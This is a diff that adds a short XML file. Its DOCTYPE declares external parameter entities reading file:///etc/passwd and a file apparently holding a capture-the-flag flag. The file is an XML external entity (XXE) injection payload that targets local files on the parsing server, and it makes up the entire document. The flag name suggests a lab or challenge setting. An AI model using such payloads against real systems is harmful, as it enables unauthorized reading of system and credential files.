@@ -1,0 +1,5 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ENTITY % payload SYSTEM "file:///etc/passwd">
+<!ENTITY % param1 SYSTEM "file:///flag_b74f64f19db36b81eabf4def158584f8">
+]>
